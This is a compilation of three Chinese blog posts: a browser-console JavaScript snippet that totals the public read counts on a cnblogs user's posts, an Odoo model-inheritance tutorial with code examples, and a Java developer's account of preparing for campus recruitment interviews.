　　我们直接用子线程的代码去统计别人的博客的总阅读量，不需要大幅度改动，直接将myCnblogsName的值改成对应的博客地址名称，我们进行简单封装成一个function，然后跑去博客主页打开F12在控制台运行代码然后调用function即可，简单方便，即开即用

/**
    输入别人的博客园地址名称
*/
function statistical(myCnblogsName){
    console.log("我是worker 任务线程 正在统计 "+myCnblogsName+" 的博客的总阅读量..");

    //任务线程内部的全局变量数组，用于保存数据
    var statisticsArray = [];

    //发送ajax请求博客园
    function getReadData(page){
        //是否还要继续
        var flag = false;

        //使用XMLHttpRequest对象请求博客园
        var xhr = new XMLHttpRequest();            
        xhr.open('GET', "https://www.cnblogs.com/"+myCnblogsName+"/default.html?page=" + page, false);//同步
        xhr.setRequestHeader("Content-Type", "text/html; charset=utf-8"); //设置响应格式
        xhr.onreadystatechange = function() {
          // readyState == 4说明请求已完成
          if (xhr.readyState == 4 && xhr.status == 200 || xhr.status == 304) { 
            //使用正则处理HTML字符串，需要设置全局标识
                //var myRe = /huanzi-qch\s+阅读[(]+[1-9]\d+[)]/g;
                var myRe = /阅读[(]+[1-9]\d+[)]/g;
                var resultArray = xhr.responseText.match(myRe);

                //合并到全局变量数组中
                statisticsArray = statisticsArray.concat(resultArray);

                //判断这个即可：resultArray.length > 0     如果还有文章集合，则返回true
                if(resultArray && resultArray.length > 0){
                    flag = true;
                }
          }
        };
        xhr.send();

        return flag;
    }


    //循环调用getReadData，默认最大页数 100 （100页，每页10条记录，相对于1000篇博客，已经够多了吧？）
    for(var i = 1;i < 100;i++){
        //如果返回false则立即跳出循环
        if(!getReadData(i)){ break;}
    }

    //处理全局数组
    for(var i = 0;i < statisticsArray.length;i++){
        if(statisticsArray[i]){
            //只保留数字部分
            statisticsArray[i] = statisticsArray[i].match(/[1-9]\d+/)[0];
        }else{
            statisticsArray.splice(i, 1);
        }
    }

    //数组求和，需要返回主线程的最终值
    var count = eval(statisticsArray.join("+"));

    console.log("统计结束，总阅读量为："+count);
}

 
　　我们去统计一下推荐博客排行榜中的部分大佬看一看他们的总阅读量是多少
 
　　看了一下他们的随笔数量，一个是六百多，一个是一百多，我们定义的循环次数100是够用的，其实改成for(;;)也没有问题，因为我们已经设置了break的条件
    
　　然后去他们的博客主页打开控制台，运行代码，然后调用statistical方法
    
 
 　　不愧是大佬啊，总阅读量一个是七百万，一个是三百万
 　　
 
********************************************************************************************************************************************************************************************************
odoo 模型继承
在odoo中有两种模型的继承机制（传统方式和委托继承方式）
重点：在__manifest__.py中找到depends,加上要继承的模块
'depends': ['account']

注意继承的模型所在addon需要在本addon里添加依赖，不然会报一个TypeError: Model 'xxx' does not exist in registry 错误。

传统方式

能够添加字段 改写字段定义 添加约束 添加或改写方法共有两种写法 1 类继承 2 原型继承

类继承
_name = 'event.registration'
_inherit = 'event.registration'

_name和_inherit的模型名一致，都为'event.registration', 此时_name可以省略不写。
类继承不会创建新的模型，能够直接修改模型定义，新加的字段会在原表中添加，数据库中没有新的表生成。

例子
class model_1(models.Model):
    _name = 'activity.registration'
    
class model_2(models.Model):
    _inherit = 'event.registration'

    event_id = fields.Many2one(
       'activity.event', string='Event', required=True,
        readonly=True, states={'draft': [('readonly', False)]})
原型继承
_name = 'activity.registration'
_inherit = 'event.registration'

_name 和 _inherit 的模型名不同。 相当于把模型 event 的属性（字段 方法等）copy了一份，重新创建一个新的模型 activity，新的表里有模型 event 的字段。

例子
class ActivityRegistration(models.Model):
    _name = 'event.registration'    
    name = fields.Char()     
    def say(self):         
        return self.check("event")     
    def check(self, s):         
        return "This is {} record {}".format(s, self.name) 

class ActivityRegistration(models.Model):
    _name = 'activity.registration'
    _inherit = 'event.registration'     
    def say(self):         
        return self.check("activity")

支持多重继承，用列表表示 _inherit = ['mail', 'resource']

委托继承
class NewModel():     
    _name = "new.model"     
    _inherits = {'模型1': '关联字段1','模型2': '关联字段2'}

支持多重继承，并提供透明的子模型字段访问方法，好像模型有子模型字段

例子
class Child0(models.Model):     
    _name = 'delegation.child0'     
    field_0 = fields.Integer() 
class Child1(models.Model):     
    _name = 'delegation.child1'     
    field_1 = fields.Integer() 
class Delegating(models.Model):     
    _name = 'delegation.parent'     
    _inherits = {         
        'delegation.child0': 'child0_id',         
        'delegation.child1': 'child1_id',     
    }     
    child0_id = fields.Many2one('delegation.child0', required=True, ondelete='cascade')     
    child1_id = fields.Many2one('delegation.child1', required=True, ondelete='cascade')

这种继承只能继承字段，其他方法不继承可以读写子模型的字段
  record.field_1

  record.field_2

  record.write({'field_1': 4})
如果子模型里的字段重复,只能看到_inherits第一个子模型的字段


********************************************************************************************************************************************************************************************************
从Java小白到阿里巴巴工程师，回顾我两年来的学习经历
本文首发于微信公众号【程序员江湖】作者How 2 Play Life，985 软件硕士，阿里 Java 研发工程师，在技术校园招聘、自学编程、计算机考研等方面有丰富经验和独到见解，目前致力于分享程序员干货和学习经验，同时热衷于分享作为程序员的一些成长心得和生活感悟。关注后在后台回复“资料”即可领取3T免费技术学习资料（包含作者的原创文章合集）添加描述添加描述​ 写在最前我写过很多篇秋招总结，这篇文章应该是最后一篇总结，当然也是最完整，最详细的一篇总结。秋招是我人生中一段宝贵的经历，不仅是我研究生生涯交出的一份答卷，也是未来职业生涯的开端。仅以此文，献给自己，以及各位在求职路上的，或者是已经经历过校招的朋友们。不忘初心，方得始终。前言在下本是跨专业渣考研的985渣硕一枚，经历研究生两年的学习积累，有幸于2019秋季招聘中拿到几个公司的研发岗offer，包括百度，阿里，腾讯，今日头条，网易，华为等。（在秋招末期，有幸又拿到了滴滴和亚马逊的offer，那时已经11月份了，所以之前的文章里都没有提到过）一路走来也遇到很多困难，也踩了很多坑，同时我自己也探索了很多的学习方法，总结了很多心得体会，并且，我对校园招聘也做了一些研究和相应的准备。在今年的秋季招聘结束以后，我也决定把这些东西全部都写成文字，做成专题，以便分享给更多未来将要参加校招的同学。大学时期的迷茫与坚定我的本科专业是电子信息工程，基本没有接触过计算机专业的课程，只学过c语言，然后在大三的时候接触过java，Android，以及前端开发。这时候我只是一个刚刚入门的菜鸟，还不知道软件开发的水有多深，抱着试一试的态度去应聘了很多公司。结果可想而知，连简历筛选都没有通过。当年我对游戏开发很有兴趣，特别是对网易游戏情有独钟，但是当我看到网易游戏研发工程师的招聘要求时，我只能望而却步，因为它要求学历至少是985的硕士。也因为这个契机，我在大三的暑假开始准备考研，花了一个月的时间深思熟虑之后，选择了华科作为我的目标院校。于是，2016年的下半年，我成为了“两耳不闻窗外事，一心只读圣贤书”的考研党，回想起来那确实是玩命学习的半年时间，每天稳定泡在图书馆8个小时以上，有时候学到宿舍都能学到晚上12点，那时候感觉自己完全变了一个人似的，可能当一个人为了某个目标而努力时，真的会变得不一样。最终我顺利地考上了，令我意外的是，成绩还挺不错。研究生时期的方向选择对于即将读研的同学来说，一般有两件事很重要，一件事是选择导师，一件事是选择方向。我在刚读研的时候最头疼的也是这两件事情。首先说明一下，我读的是专硕，所以实验室一般不搞科研，有部分导师会带项目，由于我不打算在实验室做项目（因为我更希望去大公司里锻炼几年），所以我当时本着想要找实习的想法选择了导师，事实证明我的选择还是很正确的，我在研二有大段时间去参加实习，让我在大厂里有足够的时间去锻炼和学习。而选择方向这件事，我倒是折腾了好久。研一期间我做的最多的事情就是看书了，当时自己的方向还不明确，所以找了很多书来看。当别人都在专研数据挖掘和机器学习时，我还在各种方向之间摇摆不定。我在读研之前想做游戏开发和Android开发，但我以前也学过Java Web开发。于是我在网上了解对应方向的资讯，发现游戏研发的就业面比较窄。最后，我综合公司的岗位情况，个人兴趣，以及我之前的学习经历等因素，选定了Java开发方向。于是，我在学校的实训项目中选择了Java Web项目，从此也真正意义上地踏上了Java的学习之路。笨鸟先飞，勤能补拙尽管我的入学成绩是全学院的top3，但是，我发现，作为非科班出身的我，和很多科班同学相比，还是有一定差距的。大部分同学本科都上过计算机专业的相关课程，比如计算机网络，操作系统，数据结构等等，而我以前连听都没听过，除此之外，他们一般都会几段比较完整的项目经验，至少在Java Web方面已经算是比较熟悉了。而我在当时，只学了数据结构，另外接触过一些Java基础，有一部分项目经验，基本上就是入门水平。于是我痛定思痛，决定好好弥补我的不足，平时一有空就去图书馆找些书来看，不论是操作系统，计算机网络，还是数据库等本科课程，我都会找一些对应的书籍来看，当时不太清楚其实有些课程其实不需要特地去补，以至于我连计算机组成原理，编译原理，软件测试等方面的书都特地找来看，现在想想也是挺逗比的。由于我们上的课比较水，所以上课时间反而变成了我自学基础课程的大好时光了。所以我平时上课的时候都会带两三本书，一到两周内看完一本，虽然可能吸收的不是特别好，但是对当时的我来说还是有很大帮助的。除此之外，有时候我还会偷偷去旁听有一些本科生的课程，这也是因为我在自学一些课程的时候遇到了困难，比如《操作系统》，《数据库原理》等等。于是我花时间研究了一下本科生的课表，趁着自己没课的时候赶紧去旁听课程。有时候感觉自己在课堂中显得非常突兀，尴尬地想要逃跑，但总算是坚持地听完了一门数据库的课程。此外，我还在各种视频网站上看网课，比亦或是看中国MOOC的计算机基础课程，里面的操作系统，数据库等课程也让我印象深刻。就这样，每天我都把自己的时间填满，愣是在研一上学期看了好几本书，当时书的版本现在有的记不清了，主要是计算机网络，操作系统，计算机组成原理，另外还有软件工程，软件测试，设计模式，等书籍。就这样，我靠着这段时间的坚持把计算机基础课程补上来了一些。历尽艰辛，终得实习时间来到研一下半页，这时候我刚刚结束了学校的Java Web的项目实训课程，在做这个项目期间，我发现自己暴露出了很多问题，技术实践能力不足，Java基础不扎实。这件事情也给我自己敲响了警钟，因为我计划在春招期间找一份大厂的实习，但是目前看来我的水平还远远不够。压力之下，只有努力一条出路。于是，从那时候起，我开始了“留守“实验室的学习生活。为什么要在实验室学习，一是因为学习气氛好，二是因为平时大家也可以互相交流问题。每天早上9点到实验室打开电脑，晚上9点背电脑回寝室。大部分时间我会花在看书上，这段时间主要看的都是Java相关的书籍，借鉴的是江南白衣大佬的“Java后端书架”，比如《深入理解JVM虚拟机》，《Java并发编程艺术》，《深入分析Java Web技术内幕》，《深入剖析Spring源码》等等。另外一部分时间我会用来看一些技术博客，我主要是根据面经上的知识点按图索骥，找到对应讲解该知识点的文章，那时候主要还是通过搜索引擎来找文章，当然有时候看到一些重点难点也会自己写一些博客。不过这个时期并不是我大量写博客的阶段，主要还是看一些讲解面试知识点的技术博客为主。除此之外在面试前几天我会花时间去看这家公司的面经，搞懂每一个面经上的知识点，并且记录在我的笔记上，光是面经相关的笔记我就记了100多篇，这样的学习习惯我一直坚持到了秋招，确保每个面试知识点都能被我记住，消化，直至完全理解。慢慢的，笔记越来越多，我参加面试的公司也越来越多，于是我开始不断完善自己的简历，总结自己的面试技巧，选择合适的网申时机。从头到尾我大概花了3个月的时间在找实习上，期间大大小小参加了20多次面试，我也从一开始面试一问三不知的菜鸟，逐渐变成了面霸，到复习末期，我对Java常见面试知识点已经了然于胸，同时也越来越自信，不管面什么大厂都不慌不忙。这样的日子持续了好几个月，所谓世上无难事，只怕有心人。到最后，实验室里每个人都拿到了心仪的实习offer。实习路上，我明白了很多踏出学校大门，我的实习之路才刚刚开始。8个月左右的实习时间，说长也长，说短也短。但经历过这段实习之后，我才明白了很多事情。在猪场实习的日子里，我第一次了解大公司的开发流程，亲自参与项目代码的开发，我的导师会和我提需求，会指导我怎么做得更好。在这里的成长无疑是非常快速的，但我很快意识到我的问题所在，不熟悉部门技术栈，对很多Java Web的技术原理都不太熟悉，这段时间我意识到了自己的知识深度和广度都可能都有待提高。不过由于家里的一些事情。我提前离职了，所以在猪场呆的时间很短，以致于我没来得及搞懂部门项目的技术架构就走了，这也让我在离开以后感觉很遗憾，所以我下定决心在下个实习单位要好好做。离开猪场后我来到了熊厂。部门给我提的需求不算太难，大部分都是一些CURD的工作，但是这次很快就意识到了问题所在，就是我不太熟悉部门的整体技术栈，所以在需要借鉴别人代码时偶尔会看不懂。后来部门又给了新的重构需求，此时的我开始焦虑起来，是不是应该做出一些改变呢。终于，我找到了新的目标，我要搞懂部门的项目架构，了解相关技术栈（我们部门做的是私有云），一开始，我会请教我的导师，尽量去了解项目的架构设计，除此之外，我还会利用一些时间去看其他同事负责的代码，并且通过一些文档和PPT去了解这些代码的功能和意义。结合代码和文档，再加上和同时的交流，我对部门项目的架构逐渐熟悉起来，为了更好地理解每一块代码的作用，我还为一些模块的代码写了注释。当然，光看代码和文档还不能解决所有问题，因为这个项目的重点难点不在Web应用，而是在底层技术，这个项目中包含了两套架构，分别是一套OpenStack集群和一套docker集群。为了学习这两块内容，我先是看了很多博客，然后在平台上跑虚拟机和容器来做实践，最后又看了这方面的一些书籍，主要是《OpenStack设计与实现》，《docker技术入门实战》。但是这还不够，虚拟化技术与Linux内核息息相关，又需要学习者对操作系统和计算网络非常熟悉，我自知这些内容我学得还不够深入，于是我花大量时间看这方面的书，当时也遇到了几本确实不错的书，分别是《深入理解计算机系统》，《计算机网络：自顶向下方法》，还有一本没来得及看完的《Linux内核设计与实现》。虽然以后不一定会作云计算方向的开发，但是学完这些东西我还是非常开心的。到后来，我工位上的书越来越多，我对部门的技术栈也越来越熟悉，有时候我还会去听公司内各个团队组织的技术分享，有空的时候看看内网的技术课程，真正地实现了自己在技术广度上的拓展。有时候我觉得，实习生活是会骗人的，你佩戴着和正式员工一样的工牌，和他们做着类似的事情，会让你觉得你的水平已经和他们差不多了，但事实上是，在转正之前，你和他们还差得远，所以不要停下自己前进的脚步，抓紧时间学习吧，把握好你在公司里的机会，合理利用公司给你提供的资源。添加描述添加描述​秋招前的积累与沉淀研究生期间我有一件事情一直在坚持，那就是做笔记和写博客。做笔记，就是记录学习中大大小小的事情，可能是面试问题，可能是一周的学习计划，也可能知识一个知识点，总归都是值得记录的东西，对我来说，就是一种积累。而对于博客，我从一开始只用于记录项目，到后来做转载，再到后来写原创，整理系列文章，则更像是一种沉淀。但是在春招刚刚结束的这段时间，我发现一个问题，之前学过的东西忘记了很多，特别是那些理解的不够深的知识点，总是特别容易忘记。另外我发现，虽然我在笔记中记录了很多的知识点和面试题，但是往往我只看过一次，不会再去看第二次。这也意味着，虽然记录的内容很多，但是真正消化吸收的内容很少，脑子里充斥着总是那些零碎的知识点和面试问题，对于完整的知识体系知之甚少。这些问题在春招期间也不断地暴露出来，让我思考了很久。面对如此窘境，我想做出改变，趁着现在时间充裕，我想要为这些内容做一次减法，并且借此机会，推翻自己原有的知识体系，重建新的知识框架。简单说来，就是重新开始学习Java后端，这次我要用一种更高效的方式，避免走之前走的弯路，要用最高效，最合理的方式去复习。由于我之前已经有基础，所以我对完成这一目标有信心，相应地我也为此做出了明确且详细的学习计划。对于Java方向的朋友，这里要强烈推荐我的另一个公众号微信公众号【Java技术江湖】一位阿里Java工程师的技术小站，致力于分享Java后端技术文章，以及这几年学习Java的心得体会，偶尔也记录在阿里成长的点滴，和大家一起在Java学习道路上成长。添加描述​ ​我打算用几个关键词来形容这三个月的秋招复习。“具体可靠的学习计划”在三个月的时间里，我首先按照Java后端路线图安排好复习计划，每个知识点都会对应安排一段时间，比如我可能花一天时间复习“Java反射”，两天时间复习“设计模式”，一周的时间用于复习"JVM虚拟机”。我一般会在月初做好整个月的计划，然后根据进度做一些微调，但是基本上我都可以跟上进度，并且是在复习到位的前提下。所以我觉得，对于秋招这一场苦战，指定计划尤为重要，一旦计划定下来，战略目标清晰，对应的战术制定也会变得清晰，执行力也会随之变强。“写博客整合知识点”至于复习方法，我主要通过看高质量博客，并且结合代码实践的方式巩固这部分知识点，比如今天学习“concurrenthashmap”，我会去找两三篇比较好的博客先看看，主要是源码解读方面的，然后我会把它们进行整合，如果有遗漏的知识点我会再进行补充，有时候我还会自己去看看JDK源码，以便更好地理解博客内容，完成知识整合之后，我就会对应地整理出一篇博客出来，发在我的个人博客上。除此之外，当我完成了一整个专题的复习之后，我会把这些文章整理成一个专题，比如上面说的“concurrenthashmap”，实际上属于Java并发包，所以我会专门做一个博客专栏，用来完成Java并发系列的文章专题。对于每一个文章专题，我都会先理清这个专题一共有哪些内容，然后再开始整理。比如对于Java并发包，我会先写Java多线程基础的文章，再写JMM内存模型的文章，接着一步步着手写Java线程池，阻塞队列，工具类，原子类等等。这样一来这部分内容就复习完毕了，写系列文章的好处就在于，我可以从头到尾理清脉络，并且对于每一部分的知识点都做了比较好的总结。对于博客的选择，我吸取了之前的教训，宁愿花半小时看一篇高质量文章，也不花10分钟看5篇烂文章。深度阅读的好处，就是可以让这部分内容更好地融入你脑内的知识体系，而不是像其他快餐文章一样转瞬即逝。“做项目巩固实践能力”由于之前在实习期间参加的项目都比较大，我接触的模块也比较单一，没有对整体项目有一个很好的把握，所以我决定趁这段时间再巩固一下我的项目实践能力，这里的能力主要是指的是对项目架构的把握能力，以及对业务开发的熟练度，当然也包括对各种常用后端技术的熟悉程度。我花了大概一个月的时间完成了两个项目的开发，当然主要也是模仿两个开源项目做了，这两个项目都使用SpringBoot快速开发，并且用到一些常用的后端技术比如redis，云存储，以及一些常见Web框架，除此之外还涉及到了solr，爬虫等技术。虽然项目不算很难，但是我在这段时间里很快地熟悉了完整项目开发的流程，并且每天做迭代，通过Git来跟进版本，每个版本都会写清所做的内容，这也让我对项目的架构非常熟悉。在项目之余，我也找一些常用的后端组件来跑一跑demo，以便让我对这些技术有一个直观的了解，比如面试常问的dubbo，zookeeper，消息队列等组件。这些尝试也让我在理解它们的原理时更加得心应手了。“坚持刷题，注重方法”算法题是秋招笔试面试中的重头戏，每个研发同学都免不了经历算法题的摧残，对我这么一个非科班同学来说，更是让人头大。正因为如此，我放弃了刷大量LeetCode题目的方法，选择了更加行之有效的刷题方式。首先我重新刷了一遍剑指offer，并且对每道题目进行总结，尽量保证每一道题都可以记在脑子里，众所周知剑指offer中的题是面试时非常喜欢考的，所以先搞定这部分题目是最为关键的。搞定剑指offer之后，当然还要刷LeetCode了，LeetCode题目这么多，怎么选择呢，我没有按照tag刷，也没有按照顺序刷，而是参考当时一个大佬的LeetCode刷题指南来进行刷题的，他把每个类型的题目都做了归纳，每部分只放一些比较经典的题目。所以我前后大概刷了100多道LeetCode的题目，并且在第二遍刷题复习的时候，我也对这些题目做了一份总结。除了上面两个经典题库，我还着重刷了大厂的历年真题，这部分我主要是通过牛客网的历年真题题库来完成刷题的。说实话，真题是非常重要的，因为公司出的题目不像平时的那些算法题，可能会出得非常奇葩，所以你如果不提前适应的话会比较吃亏。完成这部分题目之后，我对算法题的复习也基本告一段落了。当我完成所有内容的复习时，提前批已经开始了。终于要上战场了，因为战前准备比较充分，所以我对秋招还是比较乐观的，但事实上，秋招不仅是攻坚战，而且是持久战，要笑到最后，确实也不是那么容易的事情。重建知识体系，对学过的东西做减法前面提到我在秋招前完成了知识体系重建，那在这里我也想跟大家分享一下我当时大致的知识体系构成。就跟我前面说的一样，我选择重新再学一遍Java后端相关的技术内容，因为我知道大致的学习方向，并且有一定的基础，所以看很多文章变得更加得心应手，写文章和做总结也更加有底气了。首先在Java基础方面，我写了20多篇原创博客，主要是对Java核心技术的解析，比如“Java反射”，“Java序列化和反序列化”，“Java异常体系”等等。在Java集合类方面，我原创了部分文章，另外整合了一些比较好的技术文章，其中最主要的就是关于hashmap的文章，当时我整合的文章几乎没有遗漏任何一个知识点。在Java并发编程方面，我主要参考了并发编程网以及一些优质博客的文章，先搞懂了Java并发原理，再一步步学习JUC并发包的组件，其中重点看了chm，并发工具类以及阻塞队列等JDK源码的解析文章，除此之外，我还会在IDE中跑JUC相关的emo，毕竟这方面的内容非常需要实践。在Java网络编程方面，我先从最基础的socket入手，再讲到NIO,AIO，并且加入了几篇对Linux IO模型解析的文章，让整个知识体系更加完整（因为NIO是基于Linux Epoll实现的），接着我又加入了对Netty的探讨，以及Tomcat中对NIO的应用，可以说是把Java网络编程一些比较重要的部分都囊括进来了。为了更好理解这部分内容，我也在网上参考了很多客户端和服务端通信的demo，最后我分别用Socket，NIO,AIO以及Netty把C/S 通信的demo都写了一遍。在JVM虚拟机方面，我则按照《深入理解JVM虚拟机》这本书的行文脉络进行文章的整理。在搞定JVM基本原理以后，我着重了解了JVM调优和实践中常遇到的问题，并且整理了常用的JVM调优工具，场景问题以及调优实践的案例，这也是因为面试中对JVM调优实践越来越重视了。在JavaWeb方面，我从Java Web相关技术的发展入手，一步步了解了每种技术存在的意义，比如JSP，Servlet，JDBC，Spring等等，然后对每种技术进行了比较全面的了解，并且着重地看了Spring和SpringMVC的源码分析文章，另外一方面，我花了很多时间去研究Tomcat的工作原理。除此之外，JavaWeb项目中常用的maven，日志组件，甚至是单测试组件，也纳入了我的系列文章里。在数据库和缓存方面，我主要学习了MySQL和Redis这两种最常用的数据库。对于Mysql，我从简单的sql开始了解，然后开始了解sql优化，MySQL的存储引擎和索引，事务及锁，还有更复杂的主从复制，分库分表等内容。对于Redis，我也是从简单的api入手，然后去了解每一种数据结构的底层实现原理，接着尝试去学习Redis的持久化方式，以及作为缓存常需要考虑的技术点，当然，也包括Redis的分布式锁实现，以及它的分布式集群方案。最后一部分就是分布式相关的理论和技术了，这个也是困扰我很久的一块内容，我主要把这块内容分为两个部分，分别是分布式理论和分布式技术，理论方面，我先了解CAP,BASE等基本知识，然后开始学习一致性协议和算法，接着探讨分布式事务。对于分布式技术，涉及的东西就更多了，例如分布式session，负载均衡，分布式锁等内容，这些知识点我都会用一到两篇文章去总结，对于分布式缓存，消息队列，以及分布式服务等内容，我会花比较多的时间去全面学习，然后总结出一个系列的文章出来。当然，对于这些技术的学习主要还是停留在理论方面，在自己的项目中能用到的比较少。至此，我的知识体系基本构建完成，这也是我在秋招中能够成功闯过那么多面试的原因。添加描述添加描述​ 秋招之路，砥砺前行不管前期做了多少准备，到秋招的时候也不能掉以轻心，从七月底第一次面试到9月基本佛系，中间经历了大大小小的面试。在完成知识体系重建以后，我把重点转向了另外几件事，一是完善和熟悉我的简历，以便在面试中能够比较好地发挥，二是持续刷题，保持对算法题和笔试真题的手感和熟练度，三则是看面经查缺补漏，我一直认为看面经是很重要的一项复习内容。就这样，我一边继续复习，以便开始了一场接一场的面试接力。起初，我面了几家小公司练手，接着阿里的提前批接踵而至，我战战兢兢地参加了阿里中间件部门的面试，面难难度还算适中，一共四轮面试，当时我的表现也还不错，问题基本都答上来了。面完不到一周以后我就收到了通过的消息，当时还有点懵。没想到第一个offer这么快就来了。这段时间内，蚂蚁金服的两个部门也给了我面试机会，我都参加了它们的面试，并且顺利地拿到了其中一个部门的offer。由于我对蚂蚁这边的业务比较感兴趣，最终选择了蚂蚁金服的offer。阿里提前批的胜利确实是意外之喜，但也大大地鼓舞了我，于是我又参加了百度和腾讯的提前批面试，由于百度的提前批不走流程，一共有四个部门面试了我，每个部门都有2到3轮面试，总计约为12次面试，到后来我已经快晕了，看到百度的电话就害怕，由于面试次数太多，有时候发挥确实也不是很好，我也没有特别在意，只当是在锻炼自己了。百度的面试难度每个部门不一样，但是每次面试必写算法题，一写算法题，时间至少就是一个小时以上，每次面试完都有一种身体被掏空的感觉。经历了百度面试的摧残以后，我手写算法的速度也变快了，很多坑也被我填上了。接下来面对腾讯的面试，我也是既激动又担心，腾讯的面试难度比较大，对于操作系统和网络的知识喜欢深挖，问的东西也很有深度，面完前三面以后，第四面拖了3周才进行。当时三面面试官对我的评价比较好，也让我信心爆棚了好久。在等待腾讯终面的期间，我参加了今日头条的面试，当时有幸拿到了一个白金码，免去笔试，事实证明白金码作用真的很大。头条的面试难度和腾讯差不多，三轮面试，同样需要写各种算法，由于是视频面试，我可以清楚地看到，头条的面试官真的非常高冷啊。面完头条我的第一感觉就是应该挂了吧。没想到最后还是给了offer。结束这几家大厂的面试之后，我觉得我的秋招已经接近尾声了，不过由于之前投的比较多，所以我又面了几家大公司，如网易，华为，快手等。到9月上旬的时候，我接连收到了bat和头条，网易的意向书，阿里最早，腾讯最晚，每收到一封意向书我都很开心，没想到最后我真的可以集齐bat等大厂的offer。9月以后，除了偶尔和同学做几场大厂的笔试，我基本就佛系了。直到后来一些外企例如亚马逊，大摩开始笔试面试，我才又重新回到了状态。截止目前，我基本上把该拒绝的offer都拒绝了，综合各方面因素的考虑，最后应该会签阿里，原因是部门是我自己喜欢的，同时给的评级也比较高。虽然腾讯也给了sp，但是最后还是忍痛割爱啦。至于百度和头条，给的offer并不是很令人满意，所以就没有考虑了。至此，我的秋招之旅总算圆满结束。添加描述添加描述​ 面经分享具体的面经都比较长，这里大概介绍一下面试的情况，具体的面经请大家关注我的公众号并回复“面经”即可查看。1 阿里面经阿里中间件研发面经蚂蚁金服研发面经岗位是研发工程师，直接找蚂蚁金服的大佬进行内推。我参与了阿里巴巴中间件部门的提前批面试，一共经历了四次面试，拿到了口头offer。然后我也参加了蚂蚁金服中间件部门的面试，经历了三次面试，但是没有走流程，所以面试中止了。最后我走的是蚂蚁金服财富事业群的流程，经历了四次面试，包括一次交叉面，最终拿到了蚂蚁金服的意向书，评级为A。阿里的面试体验还是比较好的，至少不要求手写算法，但是非常注重Java基础，中间件部门还会特别安排Java基础笔试。2 腾讯面经腾讯研发面经岗位是后台开发工程师，我没有选择意向事业群。SNG的部门捞了我的简历，开始了面试，他们的技术栈主要是Java，所以比较有的聊。一共经历了四次技术面试和一次HR面试，目前正在等待结果。腾讯的面试一如既往地注重考查网络和操作系统，并且喜欢问Linux底层的一些知识，在这方面我还是有很多不足的。3 百度面经百度研发面经百度研发面经整合版岗位是研发工程师岗位，部门包括百度智能云的三个分部门以及大搜索部门。百度的提前批面试不走流程，所以可以同时面试好多个部门，所以我参加百度面试的次数大概有12次左右，最终应该是拿了两个部门的offer。百度的面试风格非常统一，每次面试基本都要到电脑上写算法，所以那段时间写算法写的头皮发麻。4 网易面经网易研发面经面试部门是网易云音乐，岗位是Java开发工程师。网易是唯一一家我去外地面试的公司，也是我最早去实习的老东家。一共三轮面试，耗时一个下午。网易的面试比我想象中的要难，面试官会问的问题都比较深，并且会让你写一些结合实践的代码。5 头条面经今日头条研发面经岗位是后台研发工程师，地点选择了上海。我参加的是字节跳动的内推面试，当时找了一个牛友要到了白金码，再次感谢这位头条大佬。然后就开始了一下午的视频面试，一共三轮技术面试，每一轮都要写代码，问问题的风格有点像腾讯，也喜欢问一些底层知识，让我有点懵逼。更多面经请点击阅读原文进行查看。笔试经验提前批的笔试其实不是很多，我参加了网易，网易游戏，拼多多等公司的笔试，应该都是低分飘过。我的算法基础比较一般，读研之前0基础，所以这方面学的比较艰辛，分享一些我的笔试准备经验。1 打好数据结构和算法基础2 先易后难，看一些基础的算法书籍，比如《图结算法》，《啊哈算法》等等。3 剑指offer刷起来，两到三遍，做到胸有成竹4 LeetCode刷个200题左右，记得二刷，做好总结。5 到牛客网做公司的历年真题，熟悉题型，保持手感。剑指offer指南和LeetCode刷题指南可以在我的博客里找到。 其中LeetCode指南是参考@CyC2018大佬的文章。面试经验面试主要考的还是你的基础知识，需要你对Java后端技术栈有一个全局上的把握，具体说起来就太多了，具体复习方案可以参考文章后面的内容。我个人也总结了一些面试方面的经验，主要是一些技巧。1 做好自我介绍和项目总结，把握你发言的主动权2 搞清楚简历上的技术点，兵来将挡水来土掩3 注意分点答题，思路清晰，也更容易讲清楚原理。4 压力面下保持冷静，不要回怼面试官5 HR面试注意常用技巧，可以提前准备。Java后端技术专栏对于校园招聘来说，最重要的还是基础知识。下面的博客专栏出自我的技术博客 https://blog.csdn.net/a724888这些专栏中有一些文章是我自己原创的，也有一些文章是转载自技术大牛的，基本都是是我在学习Java后端的两年时间内陆续完成的。总的来说算是比较全面了，做后端方向的同学可以参考一下。深入浅出Java核心技术 本专栏主要介绍Java基础，并且会结合实现原理以及具体实例来讲解。同时还介绍了Java集合类，设计模式以及Java8的相关知识。深入理解JVM虚拟机带你走进JVM的世界，整合高质量文章以阐述虚拟机的原理及相关技术，让开发者更好地了解Java的底层运行原理以及相应的调优方法。Java并发指南本专栏主要介绍Java并发编程相关的基本原理以及进阶知识。主要包括Java多线程基础，Java并发编程基本原理以及JUC并发包的使用和源码解析。Java网络编程与NIOJava网络编程一直是很重要的一部分内容，其中涉及了socket的使用，以及Java网络编程的IO模型，譬如BIO,NIO,AIO，当然也包括Linux的网络编程模型。了解这部分知识对于理解网络编程有很多帮助。另外还补充了两个涉及NIO的重要技术：Tomcat和Netty。JavaWeb技术世界从这里开始打开去往JavaWeb世界的大门。什么是J2EE，什么是JavaWeb，以及这个生态中常用的一些技术：Maven，Spring，Tomcat，Junit，log4j等等。我们不仅要了解怎么使用它们，更要去了解它们为什么出现，其中一些技术的实现原理是什么。Spring与SpringMVC源码解析本专栏主要讲解Spring和SpringMVC的实现原理。Spring是最流行的Java框架之一。本专栏文章主要包括IOC的实现原理分析，AOP的实现原理分析，事务的实现源码分析等，当然也有SpringMVC的源码解析文章。重新学习MySQL与Redis本专栏介绍MySQL的基本知识，比如基本架构，存储引擎，索引原理，主从复制，事务等内容。当然也会讲解一些和sql语句优化有关的知识。同时本专栏里也介绍了Redis的基本实现原理，包括数据结构，主从复制，集群方案，分布式锁等实现。分布式系统理论与实践本专栏介绍分布式的基本理论和相关技术，比如CAP和BASE理论，一致性算法，以及ZooKeeper这类的分布式协调服务。在分布式实践方面，我们会讲到负载均衡，缓存，分布式事务，分布式锁，以及Dubbo这样的微服务，也包括消息队列，数据库中间件等等。后端开技术杂谈本专栏涵盖了大后端的众多技术文章，当你在Java后端方面有一定基础以后，再多了解一些相关技术总是有好处的。除了Java后端的文章以外，还会涉及Hadoop生态，云计算技术，搜索引擎，甚至包括一些数据挖掘和AI的文章。总的来说选取了一些不错的基础类文章，能让你对大后端有一个更直观的认识。我之前专门写了一篇文章介绍了Java工程师的书单，可以这里重点列举一些好书，推荐给大家。完整内容可以参考这篇文章：Java工程师必备书单《计算机网络：自顶向下》这本从应用层讲到物理层，感觉这种方式学起来更轻松。《图解算法》《啊哈算法》